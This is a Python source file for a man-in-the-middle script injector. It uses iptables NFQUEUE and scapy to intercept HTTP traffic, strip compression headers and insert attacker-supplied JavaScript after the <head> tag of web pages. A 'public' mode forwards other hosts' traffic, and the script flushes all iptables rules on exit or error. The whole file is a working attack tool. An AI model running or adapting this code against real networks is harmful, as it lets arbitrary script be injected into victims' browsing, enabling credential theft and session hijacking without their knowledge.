import argparse
import os
import subprocess
import netfilterqueue
import scapy.all as scapy
import re

def get_arg():
    parser = argparse.ArgumentParser("File Sniffer")
    parser.add_argument("-q", "--queue-number", type=int, required=True, dest="queue_number", metavar="",
                        help="[?] Number of queue")
    parser.add_argument("-s", "--script", required=True, type=str, dest="CIscript", metavar="",
                        help="[?] Injectable script")
    parser.add_argument("-p", "--port", type=int, nargs='+', required=False, default=[80], dest="port_list", metavar="",
                        help="[?] Input target app port, you can use pool of port. Default - 80")
    parser.add_argument("-u", "--usage", type=int, required=False, default=0, dest="usage", metavar="",
                        help="[?] Local or Public usage (iptables settings). 0 - Local; Else Public")
    parser.add_argument("-e", "--print-traceback", type=int, required=False, default=0, dest="error", metavar="",
                        help="[?] Print traceback, can extremely close the program -> use iptables --flush. "
                             "0 - No; Else Yes")
    return parser.parse_args()

def get_ports(arg):
    if isinstance(arg, list):
        return arg
    return [arg]

#injection_script = '<script>window.onload = function() { alert(1); };</script>'
injection_script = '<script>' + get_arg().CIscript + '</script>'
tag = "<head>"
byte_tag = tag.encode('utf-8', errors='ignore')
response_buffers = {}

def modify_load(scapy_packet, new_load):
    scapy_packet[scapy.Raw].load = new_load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet

def decoding_load(scapy_packet):
    load = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')
    new_load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
    return modify_load(scapy_packet, new_load.encode('utf-8', errors='ignore'))

def inject_script(load):
    load = load.decode('utf-8', errors='ignore')
    if tag in load:
        print("Injecting...")
        load = load.replace(tag, tag + injection_script)
    return load.encode('utf-8', errors='ignore')

def packet_process(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    args = get_arg()
    try:
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            load = scapy_packet[scapy.Raw].load
            packet_id = scapy_packet[scapy.IP].id

            for port in get_ports(args.port_list):
                if scapy_packet[scapy.TCP].dport == port:
                    new_packet = decoding_load(scapy_packet)
                    packet.set_payload(bytes(new_packet))

                elif scapy_packet[scapy.TCP].sport == port:
                    if b'Content-Length' in load:
                        content_length = re.search(b'Content-Length:\s*(\d*)', load)
                        if content_length:
                            original_length = int(content_length.group(1))
                            new_length = original_length + len(injection_script)
                            load = load.replace(content_length.group(1), str(new_length).encode('utf-8', errors='ignore'))

                    if packet_id not in response_buffers:
                        response_buffers[packet_id] = b''

                    response_buffers[packet_id] += load

                    if tag.encode('utf-8', errors='ignore') in load.lower():
                        full_response = response_buffers.pop(packet_id)
                        if re.search(byte_tag, full_response):
                            full_response = inject_script(full_response)
                            scapy_packet = modify_load(scapy_packet, full_response)
                            packet.set_payload(bytes(scapy_packet))

    except Exception as e:
        if args.error == 0:
            print(e)
        else:
            subprocess.call(["iptables", "--flush"])
            print(e.with_traceback())

    packet.accept()

def file_snif():
    if os.getuid() != 0:
        print("Use super user mode")
        exit()

    args = get_arg()
    if args.usage == 0:
        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(args.queue_number)])
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(args.queue_number)])
        print("Usage: Local")
    else:
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(args.queue_number)])
        print("Usage: Public")

    print("-" * 20)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(args.queue_number, packet_process)
    queue.run()

if __name__ == '__main__':
    try:
        args = get_arg()
        print(f"Ports: {args.port_list}")
        print("Traceback: Yes" if args.error else "Traceback: No")
        print(f"Script: {injection_script}")
        file_snif()
    except KeyboardInterrupt:
        subprocess.call(["iptables", "--flush"])
        print("\nDetected ctrl + C")
        exit()
